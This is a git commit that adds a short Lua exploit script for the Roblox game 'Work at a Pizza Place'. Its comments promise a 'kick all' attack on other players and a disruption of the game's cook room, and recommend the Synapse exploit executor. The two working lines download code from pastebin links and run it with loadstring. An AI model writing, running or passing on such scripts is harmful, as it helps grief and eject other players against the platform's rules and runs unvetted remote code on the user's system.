27000ff9a715ed4c48b2aa1a83aea838cf79fc9d
paw <5dkyQHivc7zYxjCmN4qAMH7qtkfPn8@proton.me>
2022-11-19 23:49:44 -0700

    Create WorkAtAPizzaPlaceFucker.lua

---
+++ WorkAtAPizzaPlaceFucker.lua
@@ -0,0 +1,8 @@
+--< https://www.roblox.com/games/192800/WaaPP
+--< Credits to Arsenicen#5961 / discord server: discord.gg/nsdBV6EGHz
+--< Works only on players that arent setting / use big scales for it to work better, works best on synapse
+
+--< Kick all is the first one, Cook Room fucker is the second one
+--< To use only one of them, just put -- infront of the one you don't want to use
+loadstring(game:HttpGet('https://pastebin.com/raw/3u0B77t0'))()
+loadstring(game:HttpGet('https://pastebin.com/raw/6SfPnjt4'))()
